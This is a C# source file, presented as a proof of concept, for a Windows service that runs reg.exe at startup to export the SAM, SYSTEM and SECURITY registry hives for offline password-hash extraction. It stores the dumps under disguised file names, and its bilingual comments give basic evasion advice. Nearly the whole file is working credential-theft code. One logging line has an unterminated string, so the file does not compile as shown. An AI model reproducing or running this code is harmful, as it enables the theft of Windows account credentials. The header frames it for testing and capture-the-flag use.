using System;
using System.Diagnostics;
using System.ServiceProcess;
using System.IO;
/*
Simple PoC of a service that dumps SAM, SYSTEM, SECURITY HIVES from registry for offline hash extraction. 
Note: from evasion standpoint this code is very basic, because it creates a son proccess and executes reg.exe (a bit obvious). But for testing purposes or CTF scenarios is suitable for use.
*/

namespace WindowsService1
{
    public partial class Service1 : ServiceBase
    {
        // Folder where you want to store the export files
        private string backupFolder = "C:\\TEMP"; 
        // Inicializo el path de logging
        // Specify the path to your log file.
        private string logFilePath = "C:\\Temp\\LogFile.txt"; 
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            try
            {

                // Verifico si existe el path de salida, si no se crea
                // Verify if output path exists or create it
                if (!Directory.Exists(backupFolder))
                {
                    Directory.CreateDirectory(backupFolder);
                }

                // Define los nombres de archivo de salida (nota: conviene no usar valores obvios como SAM.REG, SYSTEM.REG o SECURITY.REG)
                // Define filenames for output files (note: it is recommended not to use obvious values like SAM.REG, SYSTEM.REG or SECURITY.REG)
                string samBackupPath = Path.Combine(backupFolder, "SAMSUNG_Backup.TXT");
                string systemBackupPath = Path.Combine(backupFolder, "SYSSUNG_Backup.TXT");
                string securityBackupPath = Path.Combine(backupFolder, "SECSUNG_Backup.TXT");

                // Exporta la rama HIVE
                // Backup the SAM hive
                BackupRegistryHive("HKEY_LOCAL_MACHINE\\SAM", samBackupPath);

                // Exporta la rama SYSTEM
                // Backup the SYSTEM hive
                BackupRegistryHive("HKEY_LOCAL_MACHINE\\SYSTEM", systemBackupPath);

                // Exporta la rama SECURITY
                // Backup the SECURITY hive
                BackupRegistryHive("HKEY_LOCAL_MACHINE\\SECURITY", securityBackupPath);

                Log("All information was exported successfully: );
                //EventLog.WriteEntry("RegistryBackupService", "Registry hives backed up successfully.");
            }
            catch (Exception ex)
            {
                Log("Error exporting registry information: " + ex.Message);
                
            }
        }

        protected override void OnStop()
        {
            // Cleanup or perform other tasks when the service is stopped.
        }

        private void BackupRegistryHive(string registryPath, string backupPath)
        {
            // Inicializa un objeto process
            // Initializes a process object
            Process process = new Process();
            // Popula los atributos para iniciar el proceso 
            // Populates attributes for proccess execution

            // Binario a ejecutar
            // Binary to execute
            process.StartInfo.FileName = "reg.exe";
            // Argumentos de ejecucion "export <REGISTRY PATH> /Y"
            // Execution arguments "export <REGISTRY PATH> /Y"
            process.StartInfo.Arguments = $"export \"{registryPath}\" \"{backupPath}\" /y";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.CreateNoWindow = true;
            // Iniciale proceso hijo
            // Starts child process
            process.Start();
            process.WaitForExit();
        }

        private void Log(string message)
        {
            try
            {
                // Agrega el mensaje al archivo de log
                // Append the log message to the log file
                using (StreamWriter writer = new StreamWriter(logFilePath, true))
                {
                    writer.WriteLine(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + " - " + message);
                }
            }
            catch (Exception ex)
            {
                // Maneja errores que pudieran ocurrir durante el loggint (ej: el archivo de log no se encuentra o permisos). Poco util dado que no es interactivo
                // Handle any errors that occur during logging (e.g., file not found, permissions). A little useless because service is not interactive
                Console.WriteLine("Error writing to log file: " + ex.Message);
            }
        }

    }

}
